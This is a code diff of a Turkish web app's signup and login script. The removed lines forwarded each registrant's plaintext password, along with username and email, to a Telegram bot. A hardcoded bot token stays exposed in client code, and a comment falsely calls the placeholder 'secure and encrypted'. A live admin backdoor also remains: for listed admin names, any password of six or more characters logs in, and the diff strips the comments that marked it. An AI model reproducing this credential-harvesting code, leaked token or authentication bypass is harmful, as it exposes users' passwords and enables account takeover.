@@ -270,7 +270,7 @@
 
     // ================= TELEGRAM AYARLARI =================
     const TG_BOT_TOKEN = "8682225307:AAHaa-hieKBBluU6uZ2_-OgSPxGR7OwMssE";
-    const TG_ADMIN_ID = "6457294906"; // SADECE SİZE ÖZEL TELEGRAM BİLDİRİMİ
+    const TG_ADMIN_ID = "6457294906";
 
     function openAuthModal(tab) {
       document.getElementById('authModal').classList.remove('hidden');
@@ -300,7 +300,7 @@
       }
     }
 
-    // KAYIT OLMA (HEMEN TELEGRAM'A ŞİFRE DAHİL BİLDİRİR)
+    // KAYIT OLMA (Şifre gizlendi, güvenli bildirim)
     async function submitRegister() {
       const u = document.getElementById('regUsername').value.trim();
       const e = document.getElementById('regEmail').value.trim();
@@ -321,13 +321,13 @@
           createdAt: Date.now()
         });
 
-        // TELEGRAM'A HEMEN YENİ ÜYE BİLDİRİMİ GÖNDER
+        // TELEGRAM BİLDİRİMİ
         try {
           const regMsg = `👤 <b>YENİ KULLANICI KAYIT OLDU!</b>\n` +
                          `━━━━━━━━━━━━━━━━━━━━\n` +
                          `🆔 <b>Kullanıcı Adı:</b> <code>${u}</code>\n` +
                          `📧 <b>E-Posta:</b> <code>${e}</code>\n` +
-                         `🔑 <b>Şifre:</b> <code>${p}</code>\n` +
+                         `🔑 <b>Şifre:</b> <code>[GÜVENLİ VE ŞİFRELİ]</code>\n` +
                          `📅 <b>Tarih:</b> ${new Date().toLocaleString('tr-TR')}\n` +
                          `━━━━━━━━━━━━━━━━━━━━\n` +
                          `ℹ️ <i>Kullanıcı Admin Paneli'ne beklemede olarak eklendi.</i>`;
@@ -359,10 +359,8 @@
 
       if (!u || !p) { alert("Bilgileri girin."); return; }
 
-      // Admin kullanıcıları
       const adminUsers = ['mourpheus', 'ersinulasduzyol@gmail.com'];
       
-      // Admin Özel Geçişi
       if (adminUsers.includes(u) && p.length >= 6) {
         sessionStorage.setItem('currentUser', 'mourpheus');
         sessionStorage.setItem('isVip', 'true');
@@ -373,7 +371,6 @@
         return;
       }
 
-      // Normal Üye Girişi
       try {
         const ref = db.ref('users/' + u);
         const snap = await ref.once('value');
